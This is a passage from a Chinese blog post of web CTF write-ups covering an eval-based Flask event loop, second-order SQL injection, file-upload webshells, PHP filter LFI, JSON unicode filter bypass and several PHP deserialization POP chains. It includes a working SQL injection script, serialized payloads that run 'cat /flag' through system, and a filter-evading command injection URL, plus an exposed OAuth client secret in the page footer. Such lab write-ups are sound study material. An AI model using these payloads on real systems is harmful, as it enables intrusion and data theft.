php_value auto_prepend_fi\
le &quot;.htaccess&quot;
#\</code></pre><h2 id="Kookie"><a href="#Kookie" class="headerlink" title="Kookie"></a>Kookie</h2><p>修改cookie</p>
<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><pre><code class="python">from flask import Flask, session, request, Response
import urllib

app = Flask(__name__)
app.secret_key = &#39;*********************&#39;  # censored
url_prefix = &#39;/d5afe1f66147e857&#39;


def FLAG():
    return &#39;*********************&#39;  # censored


def trigger_event(event):
    session[&#39;log&#39;].append(event)
    if len(session[&#39;log&#39;]) &gt; 5:
        session[&#39;log&#39;] = session[&#39;log&#39;][-5:]
    if type(event) == type([]):
        request.event_queue += event
    else:
        request.event_queue.append(event)


def get_mid_str(haystack, prefix, postfix=None):
    haystack = haystack[haystack.find(prefix)+len(prefix):]
    if postfix is not None:
        haystack = haystack[:haystack.find(postfix)]
    return haystack


class RollBackException:
    pass


def execute_event_loop():
    valid_event_chars = set(
        &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;)
    resp = None
    while len(request.event_queue) &gt; 0:
        # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;
        event = request.event_queue[0]
        request.event_queue = request.event_queue[1:]
        if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)):
            continue
        for c in event:
            if c not in valid_event_chars:
                break
        else:
            is_action = event[0] == &#39;a&#39;
            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)
            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)
            try:
                event_handler = eval(
                    action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))
                ret_val = event_handler(args)
            except RollBackException:
                if resp is None:
                    resp = &#39;&#39;
                resp += &#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39;
                resp += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;
                session[&#39;num_items&#39;] = request.prev_session[&#39;num_items&#39;]
                session[&#39;points&#39;] = request.prev_session[&#39;points&#39;]
                break
            except Exception, e:
                if resp is None:
                    resp = &#39;&#39;
                # resp += str(e) # only for debugging
                continue
            if ret_val is not None:
                if resp is None:
                    resp = ret_val
                else:
                    resp += ret_val
    if resp is None or resp == &#39;&#39;:
        resp = (&#39;404 NOT FOUND&#39;, 404)
    session.modified = True
    return resp


@app.route(url_prefix+&#39;/&#39;)
def entry_point():
    querystring = urllib.unquote(request.query_string)
    request.event_queue = []
    if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &gt; 100:
        querystring = &#39;action:index;False#False&#39;
    if &#39;num_items&#39; not in session:
        session[&#39;num_items&#39;] = 0
        session[&#39;points&#39;] = 3
        session[&#39;log&#39;] = []
    request.prev_session = dict(session)
    trigger_event(querystring)
    return execute_event_loop()

# handlers/functions below --------------------------------------


def view_handler(args):
    page = args[0]
    html = &#39;&#39;
    html += &#39;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&#39;.format(
        session[&#39;num_items&#39;], session[&#39;points&#39;])
    if page == &#39;index&#39;:
        html += &#39;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39;
        html += &#39;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39;
        html += &#39;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39;
    elif page == &#39;shop&#39;:
        html += &#39;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39;
    elif page == &#39;reset&#39;:
        del session[&#39;num_items&#39;]
        html += &#39;Session reset.&lt;br /&gt;&#39;
    html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;
    return html


def index_handler(args):
    bool_show_source = str(args[0])
    bool_download_source = str(args[1])
    if bool_show_source == &#39;True&#39;:

        source = open(&#39;eventLoop.py&#39;, &#39;r&#39;)
        html = &#39;&#39;
        if bool_download_source != &#39;True&#39;:
            html += &#39;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39;
            html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;

        for line in source:
            if bool_download_source != &#39;True&#39;:
                html += line.replace(&#39;&amp;&#39;, &#39;&amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(
                    &#39; &#39;, &#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;, &#39;&amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&lt;br /&gt;&#39;)
            else:
                html += line
        source.close()

        if bool_download_source == &#39;True&#39;:
            headers = {}
            headers[&#39;Content-Type&#39;] = &#39;text/plain&#39;
            headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=serve.py&#39;
            return Response(html, headers=headers)
        else:
            return html
    else:
        trigger_event(&#39;action:view;index&#39;)


def buy_handler(args):
    num_items = int(args[0])
    if num_items &lt;= 0:
        return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0])
    session[&#39;num_items&#39;] += num_items
    trigger_event([&#39;func:consume_point;{}&#39;.format(
        num_items), &#39;action:view;index&#39;])


def consume_point_function(args):
    point_to_consume = int(args[0])
    if session[&#39;points&#39;] &lt; point_to_consume:
        raise RollBackException()
    session[&#39;points&#39;] -= point_to_consume


def show_flag_function(args):
    flag = args[0]
    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
    return &#39;You naughty boy! ;) &lt;br /&gt;&#39;


def get_flag_handler(args):
    if session[&#39;num_items&#39;] &gt;= 5:
        # show_flag_function has been disabled, no worries
        trigger_event(&#39;func:show_flag;&#39; + FLAG())
    trigger_event(&#39;action:view;index&#39;)


if __name__ == &#39;__main__&#39;:
    app.run(debug=False, host=&#39;0.0.0.0&#39;)</code></pre>
<p>我们观察:</p>
<pre><code class="python">            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)
            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)
            try:
                event_handler = eval(
                    action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))
                ret_val = event_handler(args)</code></pre>
<p>这里我们可以</p>
<p>在action后面加个#,来达到任意命令执行,但是传入的参数只能是一个list,在这里卡住我了</p>
<p>继续分析发现,这个程序的功能都基于自制的event_loop,而trigger_event()负责添加event,当传入一个list时,他会直接event+=list</p>
<p>也就是说我们可以控制event_loop的执行顺序,</p>
<p>在get_flag_handler中,我们可以将flag记录到session中但是,要求diomand&gt;=5,而正常来说我们最多只有3个</p>
<p>我们观察buy</p>
<pre><code class="python">def buy_handler(args):
    num_items = int(args[0])
    if num_items &lt;= 0:
        return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0])
    session[&#39;num_items&#39;] += num_items
    trigger_event([&#39;func:consume_point;{}&#39;.format(
        num_items), &#39;action:view;index&#39;])</code></pre>
<p>这个是先将物品添加然后向event_loop中添加事件,结合我们前面的发现,我们可以在调用buy_handler后直接调用get_flag_handler,这样我们就能拿到flag了</p>
<p>访问:<code>d5afe1f66147e857/?action:trigger_event%23;action:buy;99%23action:get_flag;%23</code>,将session解码后拿到flag</p>
<p><code>flag{ba772083-fe23-4258-897e-63c9a99ff66f}</code></p>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code class="python">import requests
import re,time
import binascii
def sql_inj(sql):
    result=&quot;&quot;
    count=1
    while True:
        if result!=&quot;&quot;:
            username=&quot;admin\&quot;-(updatexml(1,concat(0x7e,replace(({sql}),{result},\&quot;\&quot;),0x7e),1))#&quot;.format(sql=sql,result=(&quot;0x&quot;+str(binascii.hexlify(bytes(result,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)))
        else:
            username=&quot;admin\&quot;-(updatexml(1,concat(0x7e,replace(({sql}),\&quot;\&quot;,\&quot;\&quot;),0x7e),1))#&quot;.format(sql=sql,result=(&quot;0x&quot;+str(binascii.hexlify(bytes(result,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)))
        burp0_url = &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn:80/register.php&quot;
        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;r658aaumj82f5f6itd5freua14&quot;}
        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Origin&quot;: &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/register.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;username&quot;:username , &quot;password&quot;: &quot;a&quot;, &quot;email&quot;: &quot;a&quot;}
        res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        print(username)
        #print(res.text)
        session = requests.session()
        url=&quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/login.php&quot;
        data={
            &quot;username&quot;:username,
            &quot;password&quot;:&quot;a&quot;
        }
        res=session.post(url, data=data) 
        #print(res.text)
        res=session.post(&quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/changepwd.php&quot;,data={&quot;oldpass&quot;:&quot;a&quot;,&quot;newpass&quot;:&quot;a&quot;})
        print(res.text)
        tmp=re.match(r&quot;.*XPATH syntax error: &#39;(.*)&#39;.*&quot;,res.text,flags=re.DOTALL).group(1)
        if tmp!=&quot;&quot; and tmp[0]==&quot;~&quot;:
            tmp=tmp[1:]
        if tmp!=&quot;&quot; and tmp[-1]==&quot;~&quot;:
            tmp=tmp[:-1] 
        result+=tmp
        print(result)
        if tmp.strip() is &quot;&quot;:
            break
        count+=30
        time.sleep(0.5)
    print(result)
sql_inj(&quot;select(group_concat(load_file(0x2f6574632f706173737764)))&quot;)
</code></pre>
<pre><code>article,flag,users
flag
title,content
name,pwd,email,real_flag_1s_here</code></pre><p><code>flag{9b73df68-406f-439e-9076-c9a9f37f5255}</code></p>
<p>二次注入</p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>easy</p>
<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>后缀名限制:php</p>
<p>上传htaccess+图片马</p>
<p><code>flag{c4ab5af4-4cb4-45bf-9cb3-ebe35922eca9}</code></p>
<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>修改xff头</p>
<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>测试发现</p>
<pre><code>Warning: include(meowers&#39;.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37

Warning: include(): Failed opening &#39;meowers&#39;.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 37</code></pre><p>index.php</p>
<pre><code class="php">&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
    &lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;
    &lt;title&gt;Had a bad day?&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;
      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;
        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;
          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;
          &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;
        &lt;div&gt;
      &lt;/header&gt;
      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;
      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;
        &lt;div class=&quot;page-container mdl-grid&quot;&gt;
          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;
          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;
            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;
            &lt;/div&gt;
            &lt;h3&gt;Cheer up!&lt;/h3&gt;
              &lt;p&gt;
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              &lt;/p&gt;
              &lt;div class=&quot;page-include&quot;&gt;
              &lt;?php
                $file = $_GET[&#39;category&#39;];

                if(isset($file))
                {
                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;)){
                        include ($file . &#39;.php&#39;);
                    }
                    else{
                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
                    }
                }
                ?&gt;
            &lt;/div&gt;
          &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;
              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;
              &lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;
          &lt;/form&gt;

          &lt;/div&gt;
        &lt;/div&gt;
      &lt;/main&gt;
    &lt;/div&gt;
    &lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>在扫目录时发现flag.php</p>
<p><code>http://12d20382-ff0d-44bf-abfd-50a08a5b8604.node3.buuoj.cn/index.php?category=php://filter/read=convert.base64-encode/resource=woofers/../flag</code></p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><pre><code class="php">&lt;?php
error_reporting(0);

if (isset($_GET[&#39;source&#39;])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    &#39;\.\.&#39;,
    // no stream wrapper
    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,
    // no data exfiltration
    &#39;flag&#39;
  ];
  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents(&#39;php://input&#39;);
$json = json_decode($body, true);

if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) {
  $page = $json[&#39;page&#39;];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;
  }
} else {
  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;
}

// no data exfiltration!!!
$content = preg_replace(&#39;/HarekazeCTF\{.+\}/i&#39;, &#39;HarekazeCTF{&amp;lt;censored&amp;gt;}&#39;, $content);
echo json_encode([&#39;content&#39; =&gt; $content]);</code></pre>
<p>学到了学到了</p>
<p>json_decode在解析类似<code>\u0020</code>的时候会把他当成一个unicode字符,也就是说它会变成<code>空格</code></p>
<p>这个在官方文档里也有涉及<code>PHP implements a superset of JSON as specified in the original » RFC 7159.</code></p>
<p>去查RFC 7159就会发现</p>
<blockquote>
<pre><code>  Any character may be escaped.  If the character is in the Basic
  Multilingual Plane (U+0000 through U+FFFF), then it may be
  represented as a six-character sequence: a reverse solidus, followed
  by the lowercase letter u, followed by four hexadecimal digits that
  encode the character&#39;s code point.  The hexadecimal letters A though
  F can be upper or lower case.  So, for example, a string containing
  only a single reverse solidus character may be represented as
  &quot;\u005C&quot;.</code></pre></blockquote>
<h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2><pre><code class="php">&lt;?php
//backup in source.tar.gz

namespace App\Http\Controllers;


class IndexController extends Controller
{
    public function index(\Illuminate\Http\Request $request){
        $payload=$request-&gt;input(&quot;payload&quot;);
        if(empty($payload)){
            highlight_file(__FILE__);
        }else{
            @unserialize($payload);
        }
    }
}</code></pre>
<p>很明显是要让我们找个pop链,刚开始我天真的以为可以直接用cve的,一行注释让我明白了我的天真</p>
<p><img src="https://i.loli.net/2020/04/16/OFIVpwyUmARvcdE.png" alt="image55205"></p>
<p>这个pop链显然要从<code>__destruct</code>开始</p>
<p><img src="https://i.loli.net/2020/04/16/qu6dkEK9UMVw2IQ.png" alt="image55300"></p>
<p><img src="https://i.loli.net/2020/04/16/of6Vy52wIlsvBgQ.png" alt="image55369"></p>
<p>在经过一番搜索+wp观看大法后,我找到了</p>
<p>这里有个<code>$f($items)</code>,可以直接命令执行,前提是没有直接从<code>foreach</code>那里退出</p>
<p>不知道为啥,本机不可以,而靶场可以???</p>
<pre><code class="php">&lt;?php

namespace Symfony\Component\Cache\Adapter;

class TagAwareAdapter{
    private $deferred;
    private $getTagsByKey;
    function __construct(){
        $this-&gt;deferred=&quot;cat /flag&quot;;
        $this-&gt;getTagsByKey=&quot;system&quot;;
    }
}



$a = new \Symfony\Component\Cache\Adapter\TagAwareAdapter();
echo urlencode(serialize($a));</code></pre>
<p><code>flag{d5b22868-43a5-4784-be2f-6021702cfe89}</code></p>
<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>2333333333</p>
<p><code>flag{b84a1566-98fb-43aa-967d-95b86c42da14}</code></p>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><pre><code class="php">&lt;?php
class Modifier {
    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&gt;append($this-&gt;var);
    }
}

class Show{
    public $source;
    public $str;

    public function __toString(){
        return $this-&gt;str-&gt;source;
    }

    public function __wakeup(){
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
            echo &quot;hacker&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this-&gt;p = new Modifier();
    }

    public function __get($key){
        $function = $this-&gt;p;
        return $function();
    }
}
$a=new Show();
$b=new Show();
$b-&gt;str=new Test();
$a-&gt;source=$b;
echo urlencode(serialize($a));
?&gt;</code></pre>
<p><code>flag{ff09736d-ed1f-4089-8906-3379cbb7e019}</code></p>
<h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p><code>UpdateHelper(__destruct)-&gt;User(__toString)-&gt;Info(__call)-&gt;dbCtrl(login)</code></p>
<pre><code class="php">&lt;?php
function safe($parm){
    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);
    return str_replace($array,&#39;hacker&#39;,$parm);
}
class User
{
    public $id=1;
    public $age;
    public $nickname;
    public function __construct(){
        $this-&gt;nickname=new Info();
        $this-&gt;age=&quot;UPDATE user SET password=\&quot;c4ca4238a0b923820dcc509a6f75849b\&quot; where username=?&quot;;
    } 


}
class dbCtrl
{
    public $hostname=&quot;127.0.0.1&quot;;
    public $dbuser=&quot;root&quot;;
    public $dbpass=&quot;root&quot;;
    public $database=&quot;test&quot;;
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this-&gt;name=&#39;admin&#39;;
        $this-&gt;password=&#39;1&#39;;
        $this-&gt;token=&#39;admin&#39;;
    }
}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct(){
        $this-&gt;age=&quot;&quot;;
        $this-&gt;nickname=&quot;&quot;;
        $this-&gt;CtrlCase=new dbCtrl();
    }
}
Class UpdateHelper{
    public $id=&quot;&quot;;
    public $newinfo=&quot;&quot;;
    public $sql=&quot;&quot;;
    public function __construct(){
        $this-&gt;sql=new User();
    }
}

$nickname=&quot;&quot;;
$a=new User();
$evil=str_replace(&quot;flag&quot;,&quot;alag&quot;,serialize($a));

#echo $evil;
$age=&#39;&quot;;s:8:&quot;nickname&quot;;&#39;.$evil.&#39;s:8:&quot;CtrlCase&quot;;N;};&#39;;
$len=strlen($age);
for($i=0;$i&lt;$len;$i++){
    $age=&quot;union&quot;.$age;
};
$tmp=serialize(new Info($age,$nickname));
$result=safe($tmp);
echo $age;
unserialize($result);
?&gt;


</code></pre>
<p><code>flag{be7c6d56-1969-47d8-8eed-e672e5496d25}</code></p>
<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><pre><code>0/**/uniunionon/**/select/**/1,2,3#
0/**/uniunionon/**/select/**/1,group_concat(table_name),3/**/FROM/**/information_schema.tables/**/where/**/TABLE_SCHEMA=database()#
flag,score
0/**/uniunionon/**/select/**/1,GROUP_CONCAT(column_name),3/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#39;flag&#39;#
flag,value </code></pre><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>在robots.txt中发现fAke_f1agggg.php</p>
<p>在fAke_f1agggg.php中发现fl4g.php</p>
<pre><code class="php">&lt;img src=&quot;/img.jpg&quot;&gt;
&lt;?php
header(&#39;Content-type:text/html;charset=utf-8&#39;);
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET[&#39;num&#39;])){
    $num = $_GET[&#39;num&#39;];
    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){
        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;
    }else{
        die(&quot;金钱解决不了穷人的本质问题&quot;);
    }
}else{
    die(&quot;去非洲吧&quot;);
}
//level 2
if (isset($_GET[&#39;md5&#39;])){
   $md5=$_GET[&#39;md5&#39;];
   if ($md5==md5($md5))
       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;
   else
       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);
}else{
    die(&quot;去非洲吧&quot;);
}

//get flag
if (isset($_GET[&#39;get_flag&#39;])){
    $get_flag = $_GET[&#39;get_flag&#39;];
    if(!strstr($get_flag,&quot; &quot;)){
        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);
        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;
        system($get_flag);
    }else{
        die(&quot;快到非洲了&quot;);
    }
}else{
    die(&quot;去非洲吧&quot;);
}
?&gt;</code></pre>
<pre><code>/fl4g.php?num=1e10&amp;md5=0e215962017&amp;get_flag=a%3dc%26%26b%3da%26%26c%3dt%26%26$a$b$c%09*</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/05/4月做题/">http://blog.ccreater.top/2020/05/05/4月做题/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/05/4%E6%9C%88%E5%81%9A%E9%A2%98/" data-id="cka3ckr4j006vv4v052av6v5g" data-title="4月做题" class="article-share-link">Share</a>
      
	  
			  
				  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
  <script src="/js/md5.min.js"></script>
<div id="gitalk-container"></div>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: '3fd4b7c51e3cfe6d1f43',
        clientSecret: 'e3b1162bfd0bc86431672a764a8c801b4dc97929',
        id: md5(window.location.pathname),
        repo: 'Explorersss.github.io',
        owner: 'Explorersss',
        admin: 'Explorersss',
        distractionFreeMode: 'true'
    })
    gitalk.render('gitalk-container')
</script>
				
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          maven学习笔记
        
      </div>
    </a>
  
  
    <a href="/2020/04/20/byb2019/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">百越杯2019</div>
    </a>
  
</nav>

  
</article>




</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
